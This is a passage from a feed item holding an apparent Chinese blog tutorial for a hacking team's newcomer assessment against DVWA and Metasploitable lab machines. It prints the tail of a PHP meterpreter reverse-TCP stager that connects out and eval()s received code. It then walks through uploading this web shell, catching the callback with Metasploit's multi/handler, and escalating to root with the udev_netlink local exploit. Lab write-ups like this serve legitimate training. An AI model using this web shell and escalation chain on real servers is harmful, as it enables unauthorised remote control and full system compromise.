style=&#34;color:#e6db74&#34;&gt;&amp;#39;stream&amp;#39;&lt;/span&gt;; } &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$s &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ($f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fsockopen&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_callable&lt;/span&gt;($f)) { $s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $f($ip, $port); $s_type &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;stream&amp;#39;&lt;/span&gt;; } &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$s &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ($f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;socket_create&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_callable&lt;/span&gt;($f)) { $s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $f(&lt;span style=&#34;color:#a6e22e&#34;&gt;AF_INET&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;SOCK_STREAM&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;SOL_TCP&lt;/span&gt;); $res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;socket_connect&lt;/span&gt;($s, $ip, $port); &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$res) { &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(); } $s_type &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;socket&amp;#39;&lt;/span&gt;; } &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$s_type) { &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no socket funcs&amp;#39;&lt;/span&gt;); } &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$s) { &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no socket&amp;#39;&lt;/span&gt;); } &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; ($s_type) { &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;stream&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; $len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fread&lt;/span&gt;($s, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;socket&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; $len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;socket_read&lt;/span&gt;($s, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;; } &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$len) { &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(); } $a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;unpack&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Nlen&amp;#34;&lt;/span&gt;, $len); $len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $a[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;len&amp;#39;&lt;/span&gt;]; $b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;strlen&lt;/span&gt;($b) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; $len) { &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; ($s_type) { &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;stream&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; $b &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fread&lt;/span&gt;($s, $len&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;strlen&lt;/span&gt;($b)); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;socket&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; $b &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;socket_read&lt;/span&gt;($s, $len&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;strlen&lt;/span&gt;($b)); &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;; } } $GLOBALS[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msgsock&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $s; $GLOBALS[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;msgsock_type&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $s_type; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;extension_loaded&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;suhosin&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ini_get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;suhosin.executor.disable_eval&amp;#39;&lt;/span&gt;)) { $suhosin_bypass&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;create_function&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, $b); $suhosin_bypass(); } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; { &lt;span style=&#34;color:#66d9ef&#34;&gt;eval&lt;/span&gt;($b); } &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;();&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;html&amp;gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;head&amp;gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;meta charset=&amp;#34;utf-8&amp;#34; /&amp;gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/head&amp;gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;body&amp;gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;h1&amp;gt;Hacked&amp;lt;/h1&amp;gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/body&amp;gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/html&amp;gt;
-&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来回到DVWA，在左下角点击 &lt;strong&gt;&lt;code&gt;upload&lt;/code&gt;&lt;/strong&gt; 进入上传页面，然后点击 &lt;strong&gt;&lt;code&gt;选择文件&lt;/code&gt;&lt;/strong&gt; 再点击 &lt;strong&gt;&lt;code&gt;upload&lt;/code&gt;&lt;/strong&gt; 即可。&lt;/p&gt;
-&lt;p&gt;将这个文件上传进去。&lt;/p&gt;
-&lt;p&gt;如果这都不会我就不多说了，&lt;strong&gt;你连上传个文件都不会还想进锏幕？&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-42-57.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;然后我们可以看到这么一串东西。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;&lt;code&gt;../../hackable/uploads/test.php succesfully uploaded!&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;说明你上传成功了，接下来要用到&lt;strong&gt;msf&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;我们在终端进入msf:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo msfconsole
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不多讲了，走个命令流程，之前写过&lt;/p&gt;
-&lt;p&gt;调用模块:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 &amp;gt; use exploit/multi/handler
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;按顺序执行:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/handler&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; set lhost 192.168.0.106
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/handler&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; set lport &lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/handler&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; set payload php/meterpreter/reverse_tcp
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/handler&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; run
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行完后，如图:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-54-05.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;接下来，我们会到浏览器，直接访问&lt;code&gt;http://192.168.0.105/dvwa/hackable/uploads/test.php&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;这时，msf会收到反弹，如图:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-58-26.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-11-03_13-58-47.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;可见权限小得可怜，不过也第三关就这样通过了。权限的问题我们会在第四关解决&lt;/p&gt;
-&lt;h3 id=&#34;第四关获取root权限&#34;&gt;第四关|获取root权限&lt;/h3&gt;
-&lt;p&gt;你能做到这里说明你已经不是萌新了，最后一关：提权&lt;/p&gt;
-&lt;p&gt;这是最关键的一环，那么我们开始吧。&lt;/p&gt;
-&lt;p&gt;首先把我们刚刚获取的webshell放到后台:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; background
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后我们使用这个模块&lt;code&gt;exploit/linux/local/udev_netlink&lt;/code&gt;(用别的也可以，我个人喜欢用这个:)&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/handler&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; use exploit/linux/local/udev_netlink
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;模块的信息你可以自己输入 &lt;strong&gt;&lt;code&gt;info&lt;/code&gt;&lt;/strong&gt; 这个命令去查看，&lt;/p&gt;
-&lt;p&gt;然后我们设置刚刚webshell的session号，我的是2:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;linux/local/udev_netlink&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; set SESSION &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后执行 &lt;strong&gt;&lt;code&gt;run&lt;/code&gt;&lt;/strong&gt; 或者 &lt;strong&gt;&lt;code&gt;exploit&lt;/code&gt;&lt;/strong&gt; :&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;linux/local/udev_netlink&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; exploit
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样我们就获取到最高权限了，如图:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-11-03_14-07-51.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;我们来看看用户是不是root&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getuid
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; shell
-&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;whoami
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如图&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-11-03_14-09-15.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;然后，我们就通过了第四关，同时也通过了全部考核，接下来只要取证和提交截图就可以成为锏幕核心成员了。&lt;/p&gt;
-&lt;hr&gt;
-&lt;h2 id=&#34;结语&#34;&gt;结语&lt;/h2&gt;
-&lt;p&gt;写了一个礼拜，全是即操作即写&lt;/p&gt;
-&lt;p&gt;看完还不会的，，，在下面留言吧..&lt;/p&gt;
-&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;a href=&#34;https://wiki.archlinux.org/index.php/Main_page_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)&#34;&gt;ArchWiki&lt;/a&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;a href=&#34;https://sourceforge.net/projects/metasploitable/&#34;&gt;Metasploitable下载地址&lt;/a&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;a href=&#34;https://www.bilibili.com/video/av59729967&#34;&gt;由帝的sqlmap视频&lt;/a&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
-&lt;p&gt;&lt;strong&gt;注意：转载请注明出处，禁止用本博客去干一些作死的事情，否则后果自负，与我无关&lt;/strong&gt;&lt;/p&gt;
-- https://weepingdogel.github.io/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/ - WeepingDogel 本站遵循 CC-BY-NC 4.0 协议</description>
         </item>
     
     
